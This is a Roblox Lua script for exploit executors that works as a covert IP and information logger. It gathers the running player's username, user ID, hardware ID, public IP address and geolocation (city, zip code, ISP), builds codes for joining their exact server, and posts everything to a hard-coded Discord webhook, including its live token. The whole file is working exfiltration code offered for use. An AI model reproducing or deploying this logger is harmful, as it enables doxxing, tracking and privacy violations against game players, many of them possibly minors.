local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local webhookURL = "https://discord.com/api/webhooks/1332700184450433078/i8fiF-75GtMYY_6GmANYpolNyp8pMo-jS6WHDqTMDf9WTiSkpwf5g55quKwJ6cm-Hkpg"

-- Player Information
local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local membershipType = string.sub(tostring(player.MembershipType), 21)
local country = game.LocalizationService.RobloxLocaleId
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

-- Game Information
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

-- IP Information
local getIp = game:HttpGet("https://v4.ident.me/")
local ipInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local ipFields = {
    "query", -- IP address
    "country", -- Country
    "regionName", -- Region
    "city", -- City
    "zip", -- Zip code
    "isp", -- ISP
    "org", -- Organization
    "as", -- Autonomous system
}
local ipInfoFields = {}
for _, field in ipairs(ipFields) do
    if ipInfo[field] then
        ipInfoFields[field] = ipInfo[field]
    end
end
local ipInfoString = ""
for field, value in pairs(ipInfoFields) do
    ipInfoString = ipInfoString .. "**" .. field .. ":** " .. value .. "\n"
end

-- Join Codes
local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[" );
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]
local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

-- Exploit Detection
local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
    or (secure_load and "Sentinel")
    or (pebc_execute and "ProtoSmasher")
    or (KRNL_LOADED and "Krnl")
    or (is_sirhurt_closure and "SirHurt")
    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
    or ("Shitty Exploit")

-- Embed Payload
local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000,
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Account Age", ["value"] = tostring(accountAge), ["inline"] = true },
        { ["name"] = "Membership Type", ["value"] = membershipType, ["inline"] = true },
        { ["name"] = "Country", ["value"] = country, ["inline"] = true },
        { ["name"] = "HWID", ["value"] = hwid, ["inline"] = true },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "IP Address", ["value"] = getIp, ["inline"] = false },
        { ["name"] = "Exploit", ["value"] = webhookcheck, ["inline"] = false },
        { ["name"] = "IP Information", ["value"] = ipInfoString, ["inline"] = false },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

-- Webhook Payload
local payload = HttpService:JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

-- HTTP Request
local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end
